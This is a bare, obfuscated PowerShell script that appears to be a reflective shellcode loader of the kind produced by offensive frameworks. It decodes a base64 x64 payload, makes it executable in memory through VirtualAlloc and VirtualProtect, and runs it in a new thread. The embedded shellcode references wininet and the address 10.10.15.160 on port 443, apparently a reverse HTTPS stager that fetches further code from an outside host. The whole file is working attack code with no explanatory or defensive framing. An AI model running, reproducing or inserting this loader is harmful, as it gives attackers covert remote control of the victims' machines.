function lb4P {
        Param ($vP, $tg)
        $dX = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $dX.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($dX.GetMethod('GetModuleHandle')).Invoke($null, @($vP)))), $tg))
}

function sf {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $lM,
                [Parameter(Position = 1)] [Type] $in1b = [Void]
        )

        $aLk = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $aLk.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $lM).SetImplementationFlags('Runtime, Managed')
        $aLk.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $in1b, $lM).SetImplementationFlags('Runtime, Managed')

        return $aLk.CreateType()
}

[Byte[]]$uXh6 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRSItSGFZIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FBEi0Agi0gYSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A0AAAAxMC4xMC4xNS4xNjAAWkiJwUnHwLsBAABNMclTU2oDU0m6V4mfxgAAAAD/1ehiAAAAL1o1OE4xRXo3UTZPcWdxdUF6aF9HaEFRVWNWam1FYlp5WVFJNEFWNldDbm1Qdmh0T0NFRzRMNnJqS29jOVktd3VIR2RVckROVC1OdTFrSGJxa0dyNE05M3VxVWd4eFFEaABIicFTWkFYTTHJU0i4ADKohAAAAABQU1NJx8LrVS47/9VIicZqCl9IifFqH1pSaIAzAABJieBqBEFZSbp1Rp6GAAAAAP/VTTHAU1pIifFNMclNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrquhVAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYw1hqAFlJx8LwtaJW/9U=")
[Uint32]$pe2 = 0
$oNOlI = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lb4P kernel32.dll VirtualAlloc), (sf @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $uXh6.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($uXh6, 0, $oNOlI, $uXh6.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lb4P kernel32.dll VirtualProtect), (sf @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($oNOlI, [Uint32]$uXh6.Length, 0x10, [Ref]$pe2)) -eq $true) {
        $r03T = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lb4P kernel32.dll CreateThread), (sf @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oNOlI,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lb4P kernel32.dll WaitForSingleObject), (sf @([IntPtr], [Int32]))).Invoke($r03T,0xffffffff) | Out-Null
}
